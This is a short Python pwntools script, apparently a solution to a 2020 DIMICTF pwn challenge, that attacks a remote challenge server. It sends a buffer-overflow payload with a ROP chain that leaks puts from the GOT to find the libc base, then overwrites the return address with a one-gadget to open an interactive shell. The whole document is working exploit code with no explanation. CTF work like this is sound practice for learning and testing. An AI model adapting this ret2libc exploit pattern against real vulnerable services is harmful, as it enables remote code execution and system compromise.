from pwn import *
r=remote("ctf.dimigo.hs.kr", 10929)
#r=process("/GitHub/Writeup/CTF/2020/DIMICTF/pwn_100_cdbc21aa77e4d37d")
libc=ELF("/GitHub/Writeup/CTF/2020/DIMICTF/libc-2.27.so")
b=ELF("/GitHub/Writeup/CTF/2020/DIMICTF/pwn_100_cdbc21aa77e4d37d")
context.log_level='debug'
pr=0x4012c3
pay=b"x"*0x40
pay+=b'x'*0x8
pay+=p64(pr)
pay+=p64(0x404020) # puts@got
pay+=p64(0x401090) # puts@plt
pay+=p64(b.symbols['main'])

r.sendline(pay)
r.sendline('exit')
r.recv(0x48)
log.info(r.recvline())
l=r.recv(6)
#print(l)

libcbase=u64(l+b'\x00'+b'\x00')-libc.symbols['puts']
log.info(hex(libcbase))
pay=b'x'*0x48
pay+=p64(0x10a45c+libcbase)
#0x10a45c = oneshot
r.sendline(pay)
r.sendline('exit')
r.interactive()
